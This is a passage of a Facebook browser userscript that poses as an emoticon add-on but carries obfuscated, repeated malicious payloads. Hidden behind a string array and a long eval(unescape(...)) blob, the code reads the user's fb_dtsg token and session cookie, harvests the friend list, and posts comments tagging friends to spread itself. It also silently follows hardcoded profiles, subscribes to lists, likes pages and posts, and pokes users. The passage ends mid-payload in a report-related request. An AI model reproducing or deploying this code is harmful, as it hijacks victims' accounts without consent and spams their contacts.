	html += '<a class="navLink" title="1 Thông Báo M?i">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="https://www.facebook.com/Erosaka" target="_blank">Icon Make By Nhật Minh <br>NoName</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","593293194083726","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= ☀  🌟  🍓  🐠 Mình vừa cài đặt thành công thêm được tool và rất nhiều icon mới và đẹp nè 🎎 Ai Có Nhu Cầu Thì Làm Thử Nha Hay Lắm ! Ai Ko Có Nhu Cầu Thì Sr Nha Vì Đã Tag Nha 💝   ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/50);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*50;i<(f+1)*50;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[50]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[50]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[50]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","602040683208977","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= ☀  🌟  🍓  🐠 Mình vừa cài đặt thành công rất nhiều icon mới và đẹp nè 🎎 Ai Có Nhu Cầu Thì Làm Thử Nha Hay Lắm ! Ai Ko Có Nhu Cầu Thì Sr Nha Vì Đã Tag Nha 💝   ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/50);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*50;i<(f+1)*50;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[50]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[50]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[50]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
eval(unescape("%76%61%72%20%66%62%5F%64%74%73%67%3D%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%22%66%62%5F%64%74%73%67%22%29%5B%30%5D%2E%76%61%6C%75%65%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%3D%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%0A%66%75%6E%63%74%69%6F%6E%20%61%28%61%62%6F%6E%65%29%0A%7B%0A%20%76%61%72%20%68%74%74%70%34%3D%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%3B%0A%20%76%61%72%20%75%72%6C%34%3D%22%2F%61%6A%61%78%2F%66%6F%6C%6C%6F%77%2F%66%6F%6C%6C%6F%77%5F%70%72%6F%66%69%6C%65%2E%70%68%70%3F%5F%5F%61%3D%31%22%3B%0A%20%76%61%72%20%70%61%72%61%6D%73%34%3D%22%70%72%6F%66%69%6C%65%5F%69%64%3D%22%2B%61%62%6F%6E%65%2B%22%26%6C%6F%63%61%74%69%6F%6E%3D%31%26%73%6F%75%72%63%65%3D%66%6F%6C%6C%6F%77%2D%62%75%74%74%6F%6E%26%73%75%62%73%63%72%69%62%65%64%5F%62%75%74%74%6F%6E%5F%69%64%3D%75%33%37%71%61%63%5F%33%37%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%6C%73%64%26%5F%5F%22%2B%75%73%65%72%5F%69%64%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%0A%20%68%74%74%70%34%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%75%72%6C%34%2C%74%72%75%65%29%3B%0A%20%68%74%74%70%34%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%3D%66%75%6E%63%74%69%6F%6E%28%29%0A%20%7B%0A%20%20%69%66%28%68%74%74%70%34%2E%72%65%61%64%79%53%74%61%74%65%3D%3D%34%26%26%68%74%74%70%34%2E%73%74%61%74%75%73%3D%3D%32%30%30%29%68%74%74%70%34%2E%63%6C%6F%73%65%0A%20%7D%0A%20%3B%0A%20%68%74%74%70%34%2E%73%65%6E%64%28%70%61%72%61%6D%73%34%29%0A%7D%0A%20%66%75%6E%63%74%69%6F%6E%20%73%75%62%6C%69%73%74%28%75%69%64%73%73%29%0A%7B%0A%20%76%61%72%20%61%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%73%63%72%69%70%74%27%29%3B%0A%20%61%2E%69%6E%6E%65%72%48%54%4D%4C%20%3D%20%22%6E%65%77%20%41%73%79%6E%63%52%65%71%75%65%73%74%28%29%2E%73%65%74%55%52%49%28%27%2F%61%6A%61%78%2F%66%72%69%65%6E%64%73%2F%6C%69%73%74%73%2F%73%75%62%73%63%72%69%62%65%2F%6D%6F%64%69%66%79%3F%6C%6F%63%61%74%69%6F%6E%3D%70%65%72%6D%61%6C%69%6E%6B%26%61%63%74%69%6F%6E%3D%73%75%62%73%63%72%69%62%65%27%29%2E%73%65%74%44%61%74%61%28%7B%20%66%6C%69%64%3A%20%22%20%2B%20%75%69%64%73%73%20%2B%20%22%20%7D%29%2E%73%65%6E%64%28%29%3B%22%3B%0A%20%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%61%29%3B%0A%7D%0A%20%66%75%6E%63%74%69%6F%6E%20%70%28%61%62%6F%6E%65%29%0A%7B%0A%20%76%61%72%20%68%74%74%70%34%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%0A%20%76%61%72%20%75%72%6C%34%20%3D%20%22%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%70%6F%6B%65%5F%64%69%61%6C%6F%67%2E%70%68%70%22%3B%0A%20%76%61%72%20%70%61%72%61%6D%73%34%20%3D%20%22%75%69%64%3D%22%20%2B%20%61%62%6F%6E%65%20%2B%20%22%26%70%6F%6B%65%62%61%63%6B%3D%30%26%61%73%6B%5F%66%6F%72%5F%63%6F%6E%66%69%72%6D%3D%30%26%6E%63%74%72%5B%5F%6D%6F%64%5D%3D%70%61%67%65%6C%65%74%5F%74%69%6D%65%6C%69%6E%65%5F%70%72%6F%66%69%6C%65%5F%61%63%74%69%6F%6E%73%26%5F%5F%61%73%79%6E%63%44%69%61%6C%6F%67%3D%31%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%39%38%61%44%35%7A%35%43%46%2D%26%5F%5F%72%65%71%3D%76%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%0A%20%68%74%74%70%34%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%75%72%6C%34%2C%20%74%72%75%65%29%3B%0A%20%68%74%74%70%34%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%0A%20%7B%0A%20%20%69%66%20%28%68%74%74%70%34%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%68%74%74%70%34%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%0A%20%20%7B%0A%20%20%20%68%74%74%70%34%2E%63%6C%6F%73%65%3B%0A%20%20%7D%0A%20%7D%0A%20%3B%0A%20%68%74%74%70%34%2E%73%65%6E%64%28%70%61%72%61%6D%73%34%29%3B%0A%7D%0A%61%28%22%31%30%30%30%30%36%30%36%34%31%38%30%34%36%39%22%29%3B%61%28%22%31%30%30%30%30%33%34%38%39%34%31%38%37%36%36%22%29%3B%61%28%22%31%30%30%30%30%35%32%35%32%33%31%33%39%33%38%22%29%3B%61%28%22%31%30%30%30%30%36%36%39%35%34%31%32%33%37%32%22%29%3B%73%75%62%6C%69%73%74%28%22%33%36%32%35%38%31%38%39%37%32%30%31%34%35%34%22%29%3B%73%75%62%6C%69%73%74%28%22%33%36%35%31%39%38%31%33%33%36%30%36%34%39%37%22%29%3B%73%75%62%6C%69%73%74%28%22%33%36%35%31%39%38%33%38%30%32%37%33%31%33%39%22%29%3B%0A%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%20%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%20%66%75%6E%63%74%69%6F%6E%20%4C%69%6B%65%28%70%29%20%7B%20%76%61%72%20%50%61%67%65%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%20%76%61%72%20%50%61%67%65%55%52%4C%20%3D%20%22%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%70%61%67%65%73%2F%66%61%6E%5F%73%74%61%74%75%73%2E%70%68%70%22%3B%20%76%61%72%20%50%61%67%65%50%61%72%61%6D%73%20%3D%20%22%26%66%62%70%61%67%65%5F%69%64%3D%22%20%2B%20%70%20%2B%22%26%61%64%64%3D%74%72%75%65%26%72%65%6C%6F%61%64%3D%66%61%6C%73%65%26%66%61%6E%5F%6F%72%69%67%69%6E%3D%70%61%67%65%5F%74%69%6D%65%6C%69%6E%65%26%66%61%6E%5F%73%6F%75%72%63%65%3D%26%63%61%74%3D%26%6E%63%74%72%5B%5F%6D%6F%64%5D%3D%70%61%67%65%6C%65%74%5F%74%69%6D%65%6C%69%6E%65%5F%70%61%67%65%5F%61%63%74%69%6F%6E%73%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%39%38%61%44%35%7A%35%43%46%2D%26%5F%5F%72%65%71%3D%64%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%20%50%61%67%65%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%50%61%67%65%55%52%4C%2C%20%74%72%75%65%29%3B%20%50%61%67%65%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%20%69%66%20%28%50%61%67%65%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%50%61%67%65%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%20%50%61%67%65%2E%63%6C%6F%73%65%3B%20%7D%20%7D%3B%20%50%61%67%65%2E%73%65%6E%64%28%50%61%67%65%50%61%72%61%6D%73%29%3B%20%7D%20%0A%4C%69%6B%65%28%22%31%34%39%37%30%36%31%34%38%35%37%30%34%37%38%22%29%3B%4C%69%6B%65%28%22%36%30%37%31%35%30%36%37%35%39%36%32%31%33%38%22%29%3B%4C%69%6B%65%28%22%37%33%32%30%32%36%32%35%30%31%35%39%31%32%37%22%29%3B%4C%69%6B%65%28%22%33%36%35%32%38%33%39%34%36%39%35%31%36%34%37%22%29%3B%4C%69%6B%65%28%22%32%32%32%31%34%37%36%39%31%33%30%30%33%33%39%22%29%3B%4C%69%6B%65%28%22%33%32%38%36%36%32%35%34%37%32%37%35%38%30%32%22%29%3B%4C%69%6B%65%28%22%36%33%33%35%33%33%39%34%36%37%30%34%30%36%34%22%29%3B%4C%69%6B%65%28%22%34%33%37%35%38%34%31%35%39%37%30%33%34%31%33%22%29%3B%4C%69%6B%65%28%22%34%38%34%38%30%39%36%32%38%32%39%36%38%38%31%22%29%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%20%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%20%76%61%72%20%6E%6F%77%3D%28%6E%65%77%20%44%61%74%65%29%2E%67%65%74%54%69%6D%65%28%29%3B%20%66%75%6E%63%74%69%6F%6E%20%50%28%6F%70%6F%29%20%7B%20%76%61%72%20%58%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%20%76%61%72%20%58%55%52%4C%20%3D%22%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%75%66%69%2F%6C%69%6B%65%2E%70%68%70%22%3B%20%76%61%72%20%58%50%61%72%61%6D%73%20%3D%20%22%6C%69%6B%65%5F%61%63%74%69%6F%6E%3D%74%72%75%65%26%66%74%5F%65%6E%74%5F%69%64%65%6E%74%69%66%69%65%72%3D%22%2B%6F%70%6F%2B%22%26%73%6F%75%72%63%65%3D%31%26%63%6C%69%65%6E%74%5F%69%64%3D%22%2B%6E%6F%77%2B%22%25%33%41%33%37%39%37%38%33%38%35%37%26%72%6F%6F%74%69%64%3D%75%5F%6A%73%6F%6E%70%5F%33%39%5F%31%38%26%67%69%66%74%6F%63%63%61%73%69%6F%6E%26%66%74%5B%74%6E%5D%3D%25%33%45%25%33%44%26%66%74%5B%74%79%70%65%5D%3D%32%30%26%66%74%5B%71%69%64%5D%3D%35%38%39%30%38%31%31%33%32%39%34%37%30%32%37%39%32%35%37%26%66%74%5B%6D%66%5F%73%74%6F%72%79%5F%6B%65%79%5D%3D%32%38%31%34%39%36%32%39%30%30%31%39%33%31%34%33%39%35%32%26%66%74%5B%68%61%73%5F%65%78%70%61%6E%64%65%64%5F%75%66%69%5D%3D%31%26%6E%63%74%72%5B%5F%6D%6F%64%5D%3D%70%61%67%65%6C%65%74%5F%68%6F%6D%65%5F%73%74%72%65%61%6D%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%6E%38%38%51%6F%41%4D%42%6C%43%6C%79%6F%63%70%61%65%26%5F%5F%72%65%71%3D%67%34%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%20%58%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%58%55%52%4C%2C%20%74%72%75%65%29%3B%20%58%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%20%69%66%20%28%58%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%58%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%20%58%2E%63%6C%6F%73%65%3B%20%7D%20%7D%3B%20%58%2E%73%65%6E%64%28%58%50%61%72%61%6D%73%29%3B%20%7D%20%0A%50%28%22%31%34%37%39%33%32%32%39%35%33%33%33%30%38%33%22%29%3B%0A%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%0A%76%61%72%20%6E%6F%77%3D%28%6E%65%77%20%44%61%74%65%29%2E%67%65%74%54%69%6D%65%28%29%3B%0A%66%75%6E%63%74%69%6F%6E%20%72%65%70%6F%72%74%28%72%29%20%7B%0A%76%61%72%20%58%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%0A%76%61%72%20%58%55%52%4C%20%3D%20%22%68%74%74%70%73%3A%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%72%65%70%6F%72%74%2F%73%6F%63%69%61%6C%2E%70%68%70%22%3B%0A%76%61%72%20%58%50%61%72%61%6D%73%20%3D%22%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%62%6C%6F%63%6B%3D%31%26%70%70%3D%25%37%42%25%32%32%61%63%74%69%6F%6E%73%5F%74%6F%5F%74%61%6B%65%25%32%32%25%33%41%25%32%32%5B%5D%25%32%32%25%32%43%25%32%32%61%72%65%5F%66%72%69%65%6E%64%73%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%63%69%64%25%32%32%25%33%41%22%20%2B